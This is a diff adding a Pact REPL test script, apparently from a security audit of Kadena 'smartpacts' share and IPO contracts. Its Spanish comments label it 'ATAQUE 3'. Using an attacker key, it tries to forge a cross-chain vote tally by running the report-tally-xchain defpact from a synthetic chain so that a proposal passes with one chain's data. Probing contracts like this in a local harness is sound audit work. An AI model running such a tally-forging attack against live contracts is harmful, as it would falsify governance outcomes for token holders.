@@ -1,0 +1,50 @@
+(load "setup.repl")
+;; ATAQUE 3: completar report-tally-xchain (defpact 2 pasos) para chains 1..19
+;; e inflar reported -> 20 -> passed=true con datos de UNA sola chain.
+;; Clave: en mainnet cada chain tiene su BD y el step1 requiere SPV del step0.
+;; En el harness el estado es compartido; comprobamos si el CONTRATO permite
+;; inyectar chain sintetica (=fallo de diseno) o si algo lo bloquea.
+(begin-tx "activate IPO + seed alice 4500")
+(env-keys ["admin-key"])
+(n_d97ffd2ca290429b5dc85ce551a8d07d038e9641.smartpacts-ipo.init 0.5)
+(n_d97ffd2ca290429b5dc85ce551a8d07d038e9641.smartpacts-ipo.resume-sale)
+(commit-tx)
+(begin-tx "seed alice 4500")
+(env-data { "alice": { "keys": ["alice-key"], "pred": "keys-all" } })
+(env-sigs [{ "key": "admin-key", "caps": [(coin.TRANSFER "sender00" "alice" 2250.0)] }])
+(coin.transfer-create "sender00" "alice" (read-keyset 'alice) 2250.0)
+(env-sigs [{ "key": "alice-key", "caps": [(coin.TRANSFER "alice" (n_d97ffd2ca290429b5dc85ce551a8d07d038e9641.smartpacts-ipo.income-account) 2250.0)] }])
+(n_d97ffd2ca290429b5dc85ce551a8d07d038e9641.smartpacts-ipo.buy-shares "alice" (read-keyset 'alice) 4500.0)
+(commit-tx)
+(begin-tx "open P + vote")
+(env-keys ["admin-key"])
+(env-chain-data { "chain-id": "0", "block-time": (time "2026-06-02T00:00:00Z") })
+(n_d97ffd2ca290429b5dc85ce551a8d07d038e9641.smartpacts-shares.create-proposal "P" "t" "d" (time "2026-06-02T00:00:00Z") 259200)
+(commit-tx)
+(begin-tx "alice votes yes 4500")
+(env-chain-data { "chain-id": "0", "block-time": (time "2026-06-03T00:00:00Z") })
+(env-keys ["alice-key"])
+(n_d97ffd2ca290429b5dc85ce551a8d07d038e9641.smartpacts-shares.cast-vote "alice" "P" true)
+(commit-tx)
+
+;; hub report chain 0
+(begin-tx "report hub chain 0")
+(env-chain-data { "chain-id": "0", "block-time": (time "2026-06-06T00:00:00Z") })
+(env-keys ["atk-key"])
+(n_d97ffd2ca290429b5dc85ce551a8d07d038e9641.smartpacts-shares.report-tally-hub "P")
+(commit-tx)
+
+;; ATAQUE: para cada chain 1..19 ejecuto el defpact xchain completo.
+;; step 0 en chain N (env-chain-data chain N), step 1 (resume) via continue-pact en hub.
+(begin-tx "ATTACK xchain chain 1 step 0")
+(env-chain-data { "chain-id": "1", "block-time": (time "2026-06-06T00:00:00Z") })
+(env-keys ["atk-key"])
+(n_d97ffd2ca290429b5dc85ce551a8d07d038e9641.smartpacts-shares.report-tally-xchain "P")
+(commit-tx)
+;; step 1 (resume) en hub chain 0 via continue-pact
+(begin-tx "ATTACK xchain chain 1 step 1 (resume on hub)")
+(env-chain-data { "chain-id": "0", "block-time": (time "2026-06-06T00:00:00Z") })
+(continue-pact 1)
+(print (format "after xchain chain1: {}" [(n_d97ffd2ca290429b5dc85ce551a8d07d038e9641.smartpacts-shares.get-final-results "P")]))
+(commit-tx)
+(print "ATK3 done")
